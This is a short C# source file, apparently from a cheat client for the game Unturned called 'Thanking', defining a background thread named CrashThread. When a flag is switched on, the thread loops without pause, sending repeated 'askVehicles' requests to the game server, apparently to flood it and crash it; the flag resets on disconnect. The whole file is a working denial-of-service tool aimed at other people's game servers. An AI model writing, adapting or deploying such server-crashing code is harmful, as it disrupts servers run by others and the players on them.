using SDG.Unturned;
using Thanking.Attributes;

namespace Thanking.Threads
{
	public static class CrashThread
	{
		public static bool CrashServerEnabled;

		[Thread]
		public static void Start()
		{
			Provider.onClientDisconnected += OnDisconnect;
			
			while (true)
				if (CrashServerEnabled)
					VehicleManager.instance.channel.send("askVehicles", ESteamCall.SERVER, ESteamPacket.UPDATE_RELIABLE_BUFFER);
		}

		public static void OnDisconnect() =>
			CrashServerEnabled = false;

		public static void SendPacket()
		{
			
		}
	}
}
